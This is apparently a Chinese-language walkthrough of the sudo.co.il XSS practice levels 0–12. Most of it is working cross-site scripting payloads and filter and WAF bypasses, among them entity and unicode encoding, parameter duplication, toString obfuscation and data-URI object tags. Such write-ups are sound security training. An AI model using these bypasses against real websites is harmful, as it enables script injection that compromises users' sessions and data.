# www.sudo.co.il Writeup

## 链接

* [www.sudo.co.il](http://www.sudo.co.il/xss)

## 题目解析

### Level 0

**思路**  
先简单探测一下是否会过滤常见的标签，输入`<svg/onload=alert(1)>`，结果直接弹窗。这道开胃菜比较简单，答案如下：
```html
<svg/onload=alert(document.domain)>
```

### Level 1

**思路**  
照例先探测一下，输入`<svg/onload=alert(1)`。和上次不同，这次没有弹窗。返回的页面内容如下：
```text
Thank you for subscription!
Email <svg/onload=alert(1)> added to mailing list! 
```
查看一下页面源码，如下：
```html
<html><head></head><body>
<script async="" src="//www.google-analytics.com/analytics.js"></script><script src="analytics.js"></script>

<form action="#" method="get">
<input type="text" name="email" value="<svg/onload=alert(1)>"><input type="submit" value="Subscribe!">
</form>

Thank you for subscription!<br>
Email <b>&lt;svg/onload=alert(1)&gt;</b> added to mailing list!

</body></html>
```
很显然，`Email`这个地方对反射内容做了消毒，将`<`和`>`做了实体化编码。因此，这个地方无法注入JS代码。再观察源代码，发现`<input>`的
`value`处有可能存在attribute注入。先探测一下`"`是否会被过滤，输入`" x="`，结果如下：
```html
<form action=# method="get">
<input type="text" name="email" value="" x=""><input type="submit" value="Subscribe!">
</form>
```
可见引号未被过滤，可以进行注入。使用如下payload尝试，顺利弹窗：
```html
" autofocus="" onfocus="alert(document.domain)
```

### Level 2

**思路**  
照例先使用`<svg/onload=alert(1)>`来探测一下，查看页面源码如下：
```html
<form action=# method="get">
<input type="text" name="email" value="<svg/onload=alert(1)&gt;"><input type="submit" value="Subscribe!">
</form>

Thank you for subscription!<br>
Email <b>&lt;svg/onload=alert(1)></b> added to mailing list!
```
可以看到，在`<input>`中，`>`被实体化编码，在`Email`部分，`<`被实体化编码。因此，这两个部分无法直接注入HTML标签。尝试使用上面
Level1的payload，顺利弹窗。。。

### Level 3

**思路**  
这次就不磨叽了，直接使用Level2的代码来探测，结果如下：
```html
<form action=# method="get">
<input type="text" name="email" value=""-autofocus=""-onfocus="alert(document.domain)"><input type="submit" value="Subscribe!"></form>

Thank you for subscription!<br>
Email <b>" autofocus="" onfocus="alert(document.domain)</b> added to mailing list!
```
可以看到，注入代码中的空格被替换成了`-`，导致注入后的HTML代码不可用。这说明在服务器一侧，对HTML的filler做了过滤。绕过的方式有如下
几种：
1. 使用TAB代替空格，并做URL编码: `"%09autofocus=""%09onfocus="alert(document.domain)`，成功弹窗
2. 使用`/`代替空格：`"/autofocus=""/onfocus="alert(document.domain)`，成功弹窗
3. 使用回车代替空格，并做URL编码：`"%0aautofocus=""%0aonfocus="alert(document.domain)`，成功弹窗
4. 使用换行代替空格，并做URL编码：`"%0dautofocus=""%0donfocus="alert(document.domain)`，成功弹窗
5. 使用`/~/`代替空格，并做URL编码：`"/~/autofocus=""/~/onfocus="alert(document.domain)`，成功弹窗

### Level 4

**思路**  
还是使用Level2的代码`" autofocus="" onfocus="alert(document.domain)`来探测，结果如下：
```html
<form action=# method="get">
<input type="text" name="email" value="" autofocus="" onfocus="Alertdocument.domain"><input type="submit" value="Subscribe!"></form>

Thank you for subscription!<br>
Email <b>" autofocus="" onfocus="alert(document.domain)</b> added to mailing list!
```
可以看到，`alert(document.domain)`被替换成了`Alertdocument.domain`，说明`alert`函数已经被后端检测和处理了，尝试下`confirm`，
结果如下：
```html
<form action=# method="get">
<input type="text" name="email" value="" autofocus="" onfocus="confirmdocument.domain"><input type="submit" value="Subscribe!"></form>

Thank you for subscription!<br>
Email <b>" autofocus="" onfocus="confirm(document.domain)</b> added to mailing list!
```
`confirm`函数未被过滤，但是`(`和`)`却被过滤了。考虑使用HTML Entities Enconding来绕过，顺利弹窗：
```html
" autofocus="" onfocus="confirm&#40;document.domain&#41;
```

**参考**
[XSS常用标签及绕过姿势总结](https://www.freebuf.com/articles/web/340080.htm)
浏览器对 XSS 代码的解析顺序为：HTML解码 —— URL解码 —— JS解码(只支持UNICODE)。当可控点为单个标签属性时，可以使用 html 实体编码。

### Level 5.1

**思路**  
照例先使用`<svg/onload=alert(1)>`来探测一下，生成的页面源码如下：
```html
<html>
<body>
<script src="analytics.js"></script>
Get popup within sudo.co.il context.

<p>
your cool xss
</p>

<script>
a = '<svg\/onload=alert(1)>'
</script>

</body>
</html>
```
这次的注入点在`<script>`标签之中。因此，注入方式是触发一段我们自己的JS代码。先尝试一段简单的代码，看是否存在过滤：
```html
'; alert(1); //
```
结果如下：
```html
<script>
a = ''; alert(1); \/\/'
</script>
```
Javascript的comment符号`//`被转义了，无法弹窗。但是这段代码最终是嵌入在HTML代码中，因此可以尝试HTML的comment符号，
顺利弹窗：
```html
'; alert(document.domain);<!--
```

### Level 5.2

**思路**  
直接使用Level 5.1的代码来探测一下，无法弹窗，生成的页面源码如下：
```html
<script>

a = '\'; alert(document.domain);<!--'

</script>
```
原来是把`'`给转义成`\'`了。绕过也很简单，将`'`变成`\'`，这样处理后的结果变成`a = '\\'`，顺利绕过。代码如下：
```html
\'; alert(document.domain);<!--
```

### Level 6

**思路**  
直接使用Level 5.2的代码来探测一下，无法弹窗，生成的页面源码如下：
```html
<script>
a = '\\'; alert(document.domain);&lt;!--'
</script>
```
这次`<`被实体化编码，无法在`<script>`标签中起到任何作用。那就尝试下JS的comment符号，顺利弹窗：
```html
\'; alert(document.domain);//
```

### Level 7

**思路**  
先看一下页面源码，如下：
```html
<html>
<body>
<script src="analytics.js"></script>
Get popup within sudo.co.il context.

<p>
<a href="http://localhost/?your_payload">hohoho!!!</a>
</a>

<script>
</script>

</body>
</html>
```
这次的注入点在Anchor标签`<a>`里面。比较直接的思路是闭合`href`属性，然后加Event来调用JS代码。但无法实现题目中
要求的"popup window with document.domain (sudo.co.il) without user interaction"。因为`<a>`标签
中无法使用`autofocus`属性，不能自动触发`onfocus`事件。因此必须转换思路。首先尝试下能否闭合`<a>`标签，输入如下
代码：
```html
test"><a href="
```
结果如下：
```html
<p>
<a href="http://localhost/?test"><a href="">hohoho!!!</a>
</a>
```
说明`<a>`标签可被闭合。接下来尝试在第二个标签中注入伪协议，执行JS代码。
```html
test"><a href="javascript:alert(1)" x="
```
结果未能弹窗，检查HTML源码如下：
```html
<p>
<a href="http://localhost/?test"><a href="javascript:alert(1)" x="">hohoho!!!</a>
</a>
```
原来根据[HTML协议](https://www.w3schools.com/html/html_links.asp), 链接的`text`部分不能是另一个链接。
尝试将注入代码改成：
```html
test"><img src="javascript:alert(1)
```
仍然失败，检查源码发现`<img>`标签被过滤掉了。尝试`<svg>`，依然被过滤。尝试`<object>`，未被过滤。使用如下代码
顺利自动弹窗：
```html
test"><object data="javascript:alert(document.domain)
```

### Level 8

**思路**  
先查看源码，分析下注入点：
```html
<html>
<body>
<script src="analytics.js"></script>
Get popup within sudo.co.il context.

<p>
your cool xss
</p>

<script>
b = 1
if ( b == 2 ){ a = "your_payload" };

</script>

</body>
</html>
```
发现注入点在`<script>`标签中，但是这个分支无法进入。因此，首先要闭合这个分支，然后调用`alert()`或`confirm()`来弹窗。
尝试如下代码注入:
```html
"}; alert(1); //
```
结果没有弹窗，再查看页面源码，如下：
```html
<script>
b = 1
if ( b == 2 ){ a = ""}; Alert(1); //" };

</script>
```
发现`alert()`被替换成`Alert()`。再尝试`eval()`和`confirm()`，发现都被执行了相同的处理。因此，不能直接调用JS函数。
这里可以尝试[Javascript的toString和parseInt转换](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString).
还可以参考[XSS Cheet Sheet](https://cloud.tencent.com/developer/article/1675968). 代码如下：
```html
"}; top[8680439..toString(30)](document.domain); //
```

### Level 8.1

**思路**  
这道题和上一道比较类似，先直接用上道题的payload尝试一下，无法弹窗。检查下页面源代码：
```html
<script>
b = 1
if ( b == 2 ){
  a = ""}; top[8680439..toString(30)](document.domain); //"
}

</script>
```
发现这次`if`分之有换行，因此无法闭合大括号，考虑构造一个`else`分支来执行注入代码，如下：
```html
"} else { top[8680439..toString(30)](document.domain); //
```
成功弹窗！

### Level 9

**思路**  
先查看页面源代码，发现注入点和Level 8类似，唯一的区别是`<script>`中的双引号在这里变成了单引号。修改payload如下：
```html
'}; top[8680439..toString(30)](document.domain); //
```

### Level 10

**思路**  
先查看页面源码，分析注入点：
```html
<script>
a = 'payload'
b = document.write(a);
</script>
```
这段代码向当前页面（document）中写入了一段payload，如果payload是一段恶意代码，比如`<svg/onload=alert(1)>`，那么这段代码
会被注入到HTML页面中并自动执行。因此，可以首先尝试这段注入。结果并没有弹窗，而返回页面被重定向到一个警告页面，如下：
```text
Hacking attempt!
```
这说明后端有注入检查机制，对于黑名单中的标签或某些关键字会进行过滤。经过尝试，发现常用的注入标签，比如`<img>``<iframe>``<a>`
等都在黑名单中，因此考虑编码绕过，首先考虑base64编码：
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
```
弹窗成功，接下来尝试弹出`document.domain`:
```html
<object data="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4="></object>
```
弹窗成功，但是没有出现`document.domain`的内容，难道是`document.write()`覆盖了原来的文档，导致`document.domain`被覆盖了？
不如再尝试下Level 9的代码：
```html
'; top[8680439..toString(30)](document.domain);//
```
成功弹窗。

### Level 11

**思路**  
先查看页面源码：
```html
<html>
<body>
<script src="analytics.js"></script>

<p>
your cool xss
</p>

<script>

var queryDict = {};
location.href.substr(location.href.indexOf('?')+1).split("&").forEach( function(item) {
  queryDict[item.split("=")[0]] = item.split("=")[1]
});

a = 'your_payload';

b = document.write('<b>' + decodeURIComponent(queryDict.p) + '</b>');

</script>
<!-- use your head and not automatic scanners like burp.. it will not help -->
</body>
</html>
```
先尝试下Level 10的代码，结果并没有弹窗，而返回页面被重定向到一个警告页面，如下：
```text
Hacking attempt!
```
说明这段代码这次被过滤掉了，有可能有WAF，因此要考虑绕过。再考虑绕过之前，先分析一下前端代码：
```html
<script>
var queryDict = {}; // 定义一个字典
// 将URL中?后的查询语句取出，以 & 为分隔符进行切分。比如查询语句为 p=paylaod&a=xyz&b=efg
// 切分之后的三段分别为：p=payload a=xyz b=efg
// 然后将每一段以 = 为分隔符进行切分，= 左边的作为 Key，右边的作为 Value 存放在 queryDict 中
location.href.substr(location.href.indexOf('?')+1).split("&").forEach( function(item) {
  queryDict[item.split("=")[0]] = item.split("=")[1]
});
// payload
a = 'your_payload';
// 向当前页面中写入 <b>payload进行URI解码的结果</b>
b = document.write('<b>' + decodeURIComponent(queryDict.p) + '</b>');
</script>
```
这里可能存在两个注入点:
```html
a = 'your_payload'
```
和
```html
b = document.write('<b>' + decodeURIComponent(queryDict.p) + '</b>');
```
先看第一个注入点，如果想注入的话必须能够注入`'`来闭合JS代码。尝试后发现WAF过滤了这个字符，因此无法注入。只能考虑第二个
注入点。尝试输入`<>`，发现也被WAF检测到，因此无法注入HTML标签。怎么办呢？

**总感觉前段代码中的这段循环比较可疑，为什么要加一段循环？**  
这说明网页可以接受多个参数，那么其他参数是否可用携带注入代码呢？测试如下代码：
```html
p=payload&a=<svg/onload=alert(1)>
```
**没有报错！** 说明只有`p=xxx`可能被过滤。想来也正常，只有`p`的值才会被反射到网页中。但是还是无法绕过，假如有两个`p`参数呢？
```html
p=<svg/onload=alert(1)>&p=test
```
这次也没有报错，但是输出的结果是`test`。虽然可以绕过WAF，但还是无法把代码注入到网页中。如果想注入前端页面就不能覆盖`p`，
但如何绕过WAF呢？WAF的规则可能是怎样的呢？可能是这样的：
```text
找到最后一个 p=xxx，检查 xxx 中是否有非法的字符，如果存在则返回错误页面。
```
所以，可以尝试如下代码：
```html
p=<svg/onload=alert(1)>&mmp=test
```
结果还是被检测到了，再尝试：
```html
p=<svg/onload=alert(1)>& p=test
```
**诶，这次过了！** 虽然没有弹窗，但是也没有返回错误页面。查看页面源码，发现`document.write`的结果是这样的：
```html
<b>
    <svg onload<="" b="">
    <!-- use your head and not automatic scanners like burp.. it will not help -->
    </svg>
</b>
```
`<svg>`标签看起来有些错误，应该是`decodeURIComponent()`导致的。这个函数的参数必须是encodeURIComponent()的结果。
因此对`<svg/onload=alert(1)>`做一下URI编码，[这个网站可以编码](http://evuln.com/tools/xss-encoder/):
```html
p=%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%61%6C%65%72%74%28%31%29%3E& p=test
```
**成功弹窗！** 题目要求弹出`document.domain`，将`alert(1)`改一下就可以了:
```html
p=%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3E& p=test
```

### Level 12

**思路**  
首先分析页面源码，发现这个页面包含了一个嵌套的`<iframe>`，而 payload 则是被注入到了`<iframe>`中。尝试输入`';//`发现可以
闭合之前的JS语句，那么这里就可以注入JS代码了。根据提示，首先尝试将`changeme`的内容改成`PWNED`，注入如下代码：
```html
';parent.document.getElementById("changeme").innerHTML="PWNED";//
```
结果页面没有任何变化，从浏览器控制台可以看到错误信息`Uncaught DOMException: Permission denied to access property "document" on cross-origin object`。
观察后发现，原来`<iframe>`和当前页面不同源，因此无法访问当前页面文档。再分析一下页面的JS代码，主要有两个：
* sudo.co.il/xss/1evel12.js
* untrusted.sudo.co.il/level12.js
发现后者会向其`parent`发送消息，内容是变量`m`，而前者则允许来自`untrusted.sudo.co.il`的消息，并将其内容写入到当前网页中。
因此考虑修改变量`m`的内容来注入：
```html
';m='test-message';//
```
这回`test-message`被成功注入到了网页中！接下来考虑注入一个HTML标签：
```html
';m='<b>test</b>';//
```
结果触发了WAF的过滤，要想办法绕过。首先考虑编码绕过。HTML可以接受UNICODE编码，因此可以尝试对注入的标签做UNICODE编码。
[xssaq.com](https://xssaq.com/bm.html) 可以很方便的进行编码。
```html
';m='\u003c\u0062\u003e\u0054\u0045\u0053\u0054\u003c\u002f\u0062\u003e';//
```
结果成功注入了标签，接下来尝试`<script>alert(document.domain)</script>`的UNICODE编码注入：
```html
';m='\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0064\u006f\u006d\u0061\u0069\u006e\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e';//
```
成功弹窗！